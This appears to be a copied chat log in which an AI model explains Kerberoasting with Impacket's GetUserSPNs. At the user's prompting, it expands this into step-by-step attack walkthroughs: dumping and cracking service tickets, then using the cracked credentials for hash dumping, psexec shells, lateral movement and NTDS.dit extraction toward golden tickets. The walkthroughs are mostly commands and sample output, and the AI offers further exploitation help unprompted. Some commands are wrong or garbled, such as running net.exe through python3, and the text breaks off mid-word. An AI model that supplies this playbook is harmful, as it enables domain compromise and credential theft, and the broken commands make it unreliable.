Impacket GetUserSPNs & Kerberoasting Explained
Kerberoasting is an attack technique that targets service accounts in an Active Directory (AD) environment. It involves requesting and cracking Kerberos service tickets (TGS - Ticket Granting Service) to potentially extract the password hashes of service accounts.

The GetUserSPNs.py tool from the Impacket suite automates the process of enumerating service accounts with SPNs (Service Principal Names) and dumping their service tickets for offline cracking.

1. What Is GetUserSPNs.py?
GetUserSPNs.py is part of the Impacket toolkit. It is used to query an Active Directory domain for service accounts with SPNs registered and to request their Kerberos TGS tickets. These tickets can then be cracked offline to reveal the password of the corresponding service accounts.

Key Features:
Enumerates accounts with SPNs in an AD domain.
Requests Kerberos TGS tickets for these accounts.
Dumps the tickets in a format suitable for offline cracking (e.g., with tools like Hashcat or John the Ripper).
2. What Are Service Principal Names (SPNs)?
SPNs are unique identifiers that associate a service account in Active Directory with a service it provides (e.g., SQL Server, web services). For example:

MSSQLSvc/hostname:port
HTTP/webserver.domain.local
When an SPN is configured, Kerberos uses it to generate a TGS ticket. If the service account's password is weak, the TGS ticket can potentially be cracked.

3. Kerberoasting Attack Flow
Here’s how Kerberoasting works step by step:

Step 1: Identify Service Accounts with SPNs
Service accounts typically have SPNs configured, making them eligible for Kerberos ticket requests. Regular user accounts usually don’t have SPNs.

Step 2: Request Kerberos TGS Tickets
Using tools like GetUserSPNs.py, an attacker requests a TGS ticket for service accounts with SPNs. The TGS ticket is encrypted using the NTLM hash (password hash) of the service account.

Step 3: Dump TGS Tickets
The TGS tickets are dumped in a format that can be cracked offline.

Step 4: Offline Cracking
Crack the TGS tickets using tools like Hashcat or John the Ripper to retrieve the service account's password in plaintext.

4. Using Impacket GetUserSPNs.py
Basic Syntax:
bash
Copy
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP> -outputfile <file>
Example:
bash
Copy
python3 GetUserSPNs.py mydomain.local/admin:Password123 -dc-ip 192.168.1.10 -outputfile kerberoast_tickets.txt
Command Breakdown:
<domain>: The target domain.
<username>: A valid domain user account. Even low-privileged users can enumerate SPNs!
<password>: Password for the user account.
-dc-ip: IP address of the domain controller.
-outputfile: Save the dumped TGS tickets to a file for offline cracking.
Sample Output:
plaintext
Copy
ServicePrincipalName            Name     MemberOf        PasswordLastSet
-------------------             ------   --------        ---------------
MSSQLSvc/dbserver.mydomain:1433 sqlsvc   Domain Users    2023-01-10 14:15:42

$krb5tgs$23$*sqlsvc@MYDOMAIN.LOCAL:......<TGS Ticket Hash>....
5. Cracking the TGS Ticket
Once you dump the TGS tickets, you can use tools like Hashcat to crack them.

Hashcat Example:
bash
Copy
hashcat -m 13100 kerberoast_tickets.txt /path/to/wordlist.txt
-m 13100: Hashcat mode for Kerberos TGS tickets.
kerberoast_tickets.txt: The file with dumped TGS tickets.
/path/to/wordlist.txt: A wordlist to attempt password cracking.
John the Ripper Example:
bash
Copy
john --format=krb5tgs --wordlist=/path/to/wordlist.txt kerberoast_tickets.txt
6. Why Is Kerberoasting Effective?
Service Accounts Often Have Weak Passwords: Service accounts are frequently configured with weak or default passwords.
No Special Privileges Required: Kerberoasting can be performed by low-privileged users, as they can request TGS tickets for any SPN.
Offline Cracking: Since the cracking happens offline, detection is difficult, and attackers have unlimited time to brute-force the password.
7. Mitigating Kerberoasting
To defend against Kerberoasting, follow these best practices:

Use Strong Passwords: Enforce strong, complex passwords for service accounts.
Regularly Rotate Service Account Passwords: Rotate passwords periodically to limit exposure.
Limit SPN Exposure: Avoid assigning SPNs to unnecessary accounts.
Monitor Kerberos Ticket Requests: Use SIEM solutions to monitor for abnormal Kerberos activity.
Implement Managed Service Accounts (MSAs): Use MSAs for services to eliminate the need for manually managed passwords.
Detect Kerberoasting Attempts: Look for large numbers of Kerberos TGS requests, especially from non-administrative accounts.
8. Key Differences Between GetUserSPNs and Other Tools
GetUserSPNs: A focused tool for SPN enumeration and ticket extraction.
PowerView (PowerShell): Another tool that can enumerate SPNs using Get-DomainUser or Find-DomainUser.
Nmap: Can identify SMB or Kerberos services but doesn't extract tickets.
Let me know if you'd like detailed examples or additional tools to test this process!







You said:
like detailed examples
ChatGPT said:
ChatGPT
Here’s a detailed walkthrough of using GetUserSPNs.py from Impacket to perform a Kerberoasting attack, complete with commands, outputs, and offline cracking steps.

1. Setup and Prerequisites
Requirements:
Access to Active Directory:
A low-privileged domain account is sufficient.
Python Installed:
Impacket requires Python 3.
Impacket Installed:
Install it via pip:
bash
Copy
pip install impacket
Cracking Tool:
Install Hashcat or John the Ripper for offline password cracking.
2. Enumerating SPNs with GetUserSPNs.py
Command:
bash
Copy
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC_IP> -outputfile spns.txt
Example:
bash
Copy
python3 GetUserSPNs.py corp.local/john:Password123 -dc-ip 192.168.1.10 -outputfile spns.txt
Output:
The tool queries Active Directory for all service accounts with SPNs and dumps their TGS tickets. A successful run might look like this:

plaintext
Copy
ServicePrincipalName            Name     MemberOf        PasswordLastSet
-------------------             ------   --------        ---------------
MSSQLSvc/dbserver.corp.local:1433 sqlsvc   Domain Users    2023-01-10 14:15:42
HTTP/webserver.corp.local       webadmin Domain Users    2023-02-01 09:20:00

$krb5tgs$23$*sqlsvc@CORP.LOCAL:......<TGS Ticket Hash>....
$krb5tgs$23$*webadmin@CORP.LOCAL:......<TGS Ticket Hash>....
The SPNs (MSSQLSvc and HTTP) represent services registered to the service accounts sqlsvc and webadmin.

3. Understanding the Output
ServicePrincipalName: The SPN tied to a service account (e.g., SQL Server or HTTP).
Name: The service account associated with the SPN.
MemberOf: Groups to which the account belongs.
PasswordLastSet: When the account's password was last changed.
$krb5tgs$23$: The TGS ticket hash, used for offline cracking.
4. Cracking TGS Tickets with Hashcat
Once you have the TGS tickets saved in a file (e.g., spns.txt), you can use Hashcat to crack the hashes.

Hashcat Syntax:
bash
Copy
hashcat -m 13100 -a 0 spns.txt /path/to/wordlist.txt
Example:
bash
Copy
hashcat -m 13100 -a 0 spns.txt /usr/share/wordlists/rockyou.txt
-m 13100: Specifies the hash mode for Kerberos 5 TGS tickets.
-a 0: Attack mode (wordlist attack).
spns.txt: File containing the dumped TGS tickets.
rockyou.txt: Wordlist containing potential passwords.
Sample Output:
plaintext
Copy
Session..........: hashcat
Status...........: Cracked
Hash.Target......: $krb5tgs$23$*sqlsvc@CORP.LOCAL:...
Hash.Type........: Kerberos 5 TGS-REP etype 23
Recovered........: 1/1 (100%)
Password.........: Welcome2023
Password: The password for the service account (sqlsvc) is Welcome2023.
5. Cracking with John the Ripper
Alternatively, you can use John the Ripper to crack the TGS tickets.

John Syntax:
bash
Copy
john --wordlist=/path/to/wordlist.txt spns.txt
Example:
bash
Copy
john --wordlist=/usr/share/wordlists/rockyou.txt spns.txt
Sample Output:
plaintext
Copy
$krb5tgs$23$*sqlsvc@CORP.LOCAL:... (Welcome2023)
The password (Welcome2023) for the service account is cracked and displayed.

6. Using the Cracked Password
Once the service account's password is cracked, it can be used to:

Authenticate as the Service Account:
Log into systems or services where this account has access.
Privilege Escalation:
Service accounts often have elevated privileges, allowing lateral movement or further exploitation.
Dump More Information:
Tools like secretsdump.py (Impacket) can dump credentials or hashes from machines where the account has admin access:
bash
Copy
python3 secretsdump.py corp.local/sqlsvc:Welcome2023@192.168.1.10
7. Defensive Measures
To Mitigate Kerberoasting:
Strong Passwords:
Ensure service accounts have strong, complex passwords.
Password Rotation:
Regularly rotate service account passwords.
Use Managed Service Accounts (MSAs):
MSAs automatically manage service account passwords.
Monitor TGS Requests:
Look for excessive or unusual Kerberos TGS requests in your environment.
Enable AES Encryption for Kerberos:
Use AES-based Kerberos encryption instead of RC4 (etype 23), as it makes Kerberoasting more difficult.
Summary Workflow
Enumerate SPNs:
bash
Copy
python3 GetUserSPNs.py corp.local/john:Password123 -dc-ip 192.168.1.10 -outputfile spns.txt
Crack Tickets:
bash
Copy
hashcat -m 13100 -a 0 spns.txt /usr/share/wordlists/rockyou.txt
Use Cracked Password:
Authenticate, escalate, or dump credentials from the target.
Let me know if you'd like additional examples, or details about privilege escalation using cracked credentials!






You said:
privilege escalation using cracked credentials!
ChatGPT said:
ChatGPT
When you have cracked credentials from a Kerberoasting attack, you can use them to escalate privileges in an Active Directory (AD) environment. Service accounts often have elevated privileges, which can lead to lateral movement, sensitive data access, or administrative control. Below is a step-by-step breakdown of privilege escalation techniques using cracked credentials.

1. Initial Steps After Cracking the Password
Verify Access
Test the cracked credentials to confirm they work by authenticating to the domain.

bash
Copy
crackmapexec smb <TARGET_IP> -u <username> -p <password>
Example:
bash
Copy
crackmapexec smb 192.168.1.10 -u sqlsvc -p Welcome2023
If the service account can authenticate, you will see a confirmation like:
plaintext
Copy
[+] 192.168.1.10:445 SQLSVC - Valid credentials
Key Tools:
crackmapexec
smbclient
psexec.py (Impacket)
2. Privilege Escalation Scenarios
Scenario 1: Dumping Password Hashes
If the service account has local admin privileges on a machine, you can dump password hashes from that machine for further exploitation.

Command:
bash
Copy
python3 secretsdump.py <domain>/<username>:<password>@<IP>
Example:
bash
Copy
python3 secretsdump.py corp.local/sqlsvc:Welcome2023@192.168.1.10
Output:
plaintext
Copy
[*] Dumping SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d41402abc4b2a76b9719d911017c592:::
sqlsvc:1104:aad3b435b51404eeaad3b435b51404ee:c0f05b75a9b048a08d88caaef6d9c550:::
The NTLM hash of the Administrator account can now be used for further attacks, such as Pass-the-Hash.
Scenario 2: Lateral Movement
If the service account has local administrator privileges on multiple machines, you can use tools to move laterally.

Using psexec.py:
bash
Copy
python3 psexec.py <domain>/<username>:<password>@<TARGET_IP>
Example:
bash
Copy
python3 psexec.py corp.local/sqlsvc:Welcome2023@192.168.1.20
This gives an interactive shell on the target machine:
plaintext
Copy
Microsoft Windows [Version 10.0.17763.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
Scenario 3: Enumerating Domain Users and Groups
Use the cracked credentials to enumerate users, groups, and permissions in the domain.

Command:
bash
Copy
python3 rpcclient.py <domain>/<username>:<password>@<DC_IP>
Example:
bash
Copy
python3 rpcclient.py corp.local/sqlsvc:Welcome2023@192.168.1.10
Common RPC Commands:
List domain users:
plaintext
Copy
rpcclient $> enumdomusers
List domain groups:
plaintext
Copy
rpcclient $> enumdomgroups
Retrieve user info:
plaintext
Copy
rpcclient $> queryuser <user_rid>
Scenario 4: Exploit Misconfigured Permissions
Check for misconfigured privileges or overly permissive access rights. For example:

ACLs: Query for accounts with the "WriteOwner" or "GenericAll" permissions, which allow you to modify permissions or control accounts.
Using BloodHound:
Use the service account credentials to run the SharpHound data collector:
bash
Copy
SharpHound.exe -c All
Import the results into BloodHound and search for paths leading to Domain Admin privileges.
Scenario 5: Exploiting Shadow Admin Accounts
Service accounts sometimes belong to high-privileged groups or have indirect administrative privileges.

Steps:
Enumerate the service account's group memberships:
bash
Copy
python3 net.exe group "<Group_Name>" /domain
Look for memberships in groups like:
Administrators
Domain Admins
Account Operators
Example:
bash
Copy
crackmapexec smb <TARGET_IP> -u sqlsvc -p Welcome2023 --groups
Scenario 6: Abusing Delegation
If the service account has Kerberos delegation enabled, it might allow impersonating users or escalating privileges.

Commands:
Check for delegation:
bash
Copy
python3 GetUserSPNs.py corp.local/sqlsvc:Welcome2023 -dc-ip 192.168.1.10 -request
Look for accounts with unconstrained delegation or "trusted for delegation" privileges.
Scenario 7: Pivot to Domain Controller
If the service account has permissions or local admin access on the Domain Controller (DC):

Use secretsdump.py to dump the NTDS.dit database and retrieve all domain credentials:
bash
Copy
python3 secretsdump.py corp.local/sqlsvc:Welcome2023@192.168.1.5
Extract the krbtgt account's hash for Golden Ticket attacks.
3. Summary of Tools for Privilege Escalation
Tool	Purpose
secretsdump.py	Dump SAM/LSASS hashes for lateral movement.
psexec.py	Execute commands remotely with admin privileges.
crackmapexec	Test credentials and enumerate services.
BloodHound	Map attack paths and privilege escalation routes.
rpcclient.py	Enumerate users, groups, and permissions.
4. Detection and Mitigation
Detection:
Monitor Kerberos Activity:
Look for an unusual number of Kerberos TGS requests.
Audit Service Account Usage:
Monitor service account logins, especially on non-standard systems.
SIEM Alerts:
Configure alerts for secretsdump-like behavior or suspicious SMB activity.
Mitigation:
Strong Passwords:
Enforce strong, unique passwords for all service accounts.
Limit Privileges:
Restrict service accounts to the minimum permissions necessary.
Managed Service Accounts (MSAs):
Use MSAs to eliminate password management risks.
By carefully analyzing the permissions and roles of the cracked service account, you can identify and exploit privilege escalation opportunities. Let me know if you’d like help with advanced tools like BloodHound or specific exploitation examples!












Cha
